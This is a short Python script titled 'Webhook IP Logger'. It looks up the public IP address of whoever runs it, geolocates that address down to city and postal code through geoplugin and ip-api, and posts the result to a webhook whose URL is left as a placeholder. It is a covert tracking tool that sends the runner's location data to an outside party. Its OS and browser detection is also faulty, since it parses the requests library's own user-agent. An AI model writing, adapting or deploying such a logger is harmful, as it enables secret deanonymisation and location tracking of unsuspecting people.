import re
import requests
import json
import time
from datetime import datetime, timedelta
from pytz import timezone

user_agent = requests.get('https://httpbin.org/user-agent').json()['user-agent']

def getOS():
    os_platform = "idk console"
    os_array = {
        r'windows nt 10' : 'Windows 10',
        r'windows nt 6.3' : 'Windows 8.1',
        r'windows nt 6.2' : 'Windows 8',
        r'windows nt 6.1' : 'Windows 7',
        r'windows nt 6.0' : 'Windows Vista',
        r'windows nt 5.2' : 'Windows Server 2003/XP x64',
        r'windows nt 5.1' : 'Windows XP',
        r'windows xp' : 'Windows XP',
        r'windows nt 5.0' : 'Windows 2000',
        r'windows me' : 'Windows ME',
        r'win98' : 'Windows 98',
        r'win95' : 'Windows 95',
        r'win16' : 'Windows 3.11',
        r'macintosh|mac os x' : 'Mac OS X',
        r'mac_powerpc' : 'Mac OS 9',
        r'linux' : 'Linux',
        r'kalilinux' : 'Wannabe Hacker',
        r'ubuntu' : 'Ubuntu',
        r'iphone' : 'iPhone',
        r'ipod' : 'iPod',
        r'ipad' : 'iPad',
        r'android' : 'Android',
        r'blackberry' : 'BlackBerry',
        r'webos' : 'Mobile',
        r'Windows Phone' : 'Windows Phone'
    }

    for regex, value in os_array.items():
        if re.search(regex, user_agent, re.I):
            os_platform = value
            break

    return os_platform

def getBrowser():
    browser = "Unknown Browser"
    browser_array = {
        r'msie' : 'Internet Explorer',
        r'firefox' : 'Firefox',
        r'Mozilla' : 'Mozila',
        r'Mozilla/5.0' : 'Mozila',
        r'safari' : 'Safari',
        r'chrome' : 'Chrome',
        r'edge' : 'Edge',
        r'opera' : 'Opera',
        r'OPR' : 'Opera',
        r'netscape' : 'Netscape',
        r'maxthon' : 'Maxthon',
        r'konqueror' : 'Konqueror',
        r'Bot' : 'Spam',
        r'Valve Steam GameOverlay' : 'Steam',
        r'mobile' : 'idk console'
    }

    for regex, value in browser_array.items():
        if re.search(regex, user_agent, re.I):
            browser = value
            break

    return browser

user_os = getOS()
user_browser = getBrowser()

ip = requests.get('https://httpbin.org/ip').json()['origin']
ipdat = requests.get(f"http://www.geoplugin.net/json.gp?ip={ip}").json()
ipshet = requests.get(f"http://ip-api.com/json/{ip}").json()

sydney = timezone('Australia/Sydney')
time = datetime.now(sydney).strftime('%Y-%m-%d %H:%M:%S')

url = "Webhook Url"

hookObject = {
    "username": "IP Logger",
    "tts": False,
    "embeds": [
        {
            "title": "Webhook IP Logger",
            "type": "rich",
            "description": f"**IP: `{ip}`\nDevice: `{user_os}`\nBrowser: `{user_browser}`\nTime: `{time}`\nCountry: `{ipdat['geoplugin_countryName']}`\nCity: `{ipdat['geoplugin_city']}`\nContinent: `{ipdat['geoplugin_continentName']}`\nTimezone: `{ipdat['geoplugin_timezone']}`\nPostal Code: `{ipshet['zip']}`**",
            "url": "https://console.vip/",
            "color": int("0000", 16),
            "footer": {
                "text": "/codez",
            },
            "author": {
                "name": "LOGGED",
                "url": "https://console.vip/"
            }
        }
    ]
}

response = requests.post(url, json=hookObject)

print(response.content)
